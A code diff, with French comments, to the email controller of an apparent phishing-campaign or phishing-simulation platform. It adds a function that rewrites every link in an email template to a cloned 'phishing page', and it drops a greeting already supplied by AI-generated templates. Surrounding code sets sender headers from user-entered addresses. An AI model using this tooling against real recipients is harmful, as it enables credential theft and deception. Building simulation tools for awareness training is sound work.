@@ -239,7 +239,7 @@ class EmailController {
      * @param {Object} target - Cible
      * @returns {Object} Données de l'email formatées
      */
- buildEmailData(campaign, template, target) {
+    buildEmailData(campaign, template, target) {
         // L'adresse qui s'affiche dans le client email (celle saisie par l'utilisateur)
         const displayFromAddress = `${campaign.step5.fromName} <${campaign.step5.fromEmail}>`;
         
@@ -258,7 +258,7 @@ class EmailController {
             to: target.email,
             subject: personalizedSubject,
             html: personalizedHtml,
-         text: template.content_text || null,
+            text: template.content_text || null,
             headers: {
                 'Reply-To': campaign.step5.fromEmail,
                 'Return-Path': campaign.step5.fromEmail,
@@ -274,15 +274,18 @@ class EmailController {
      * @returns {string} Contenu personnalisé
      */
     personalizeEmailContent(content, target, clonedUrl) {
-        // Construction du message personnalisé complet
-        const personalizedContent = `
-            <p>Bonjour ${target.firstName} ${target.lastName},</p>
-            ${content}
-            <p><a href="${clonedUrl}">Accéder à votre page</a></p>
-        `;
-
-        // Remplacement des variables dans le contenu
-        return this.personalizeText(personalizedContent, target);
+        // D'abord, remplacer les variables de personnalisation dans le contenu
+        let personalizedContent = this.personalizeText(content, target);
+        
+        // Remplacer tous les liens existants dans le contenu par l'URL de la page clonée
+        // Cela redirige tous les liens du template vers la page de phishing
+        personalizedContent = this.redirectLinksToClonedPage(personalizedContent, clonedUrl);
+        
+        // MODIFICATION: Ne plus ajouter automatiquement de salutation
+        // Le template généré par l'IA contient déjà la salutation appropriée
+        // Supprimer cette logique évite la duplication "Cher X" + "Bonjour X"
+        
+        return personalizedContent;
     }
 
     /**
@@ -299,6 +302,18 @@ class EmailController {
             .replace(/\{\{position\}\}/g, target.position || '')
             .replace(/\{\{country\}\}/g, target.country || '')
             .replace(/\{\{office\}\}/g, target.office || '');
+    }
+
+    /**
+     * Redirige tous les liens existants dans le contenu vers la page clonée
+     * @param {string} htmlContent - Contenu HTML de l'email
+     * @param {string} clonedUrl - URL de la page clonée
+     * @returns {string} Contenu HTML avec les liens redirigés
+     */
+    redirectLinksToClonedPage(htmlContent, clonedUrl) {
+        // Remplace tous les liens href dans le HTML par l'URL de la page clonée
+        // Cette regex trouve tous les attributs href et les remplace
+        return htmlContent.replace(/href\s*=\s*["']([^"']*?)["']/gi, `href="${clonedUrl}"`);
     }
 
     /**
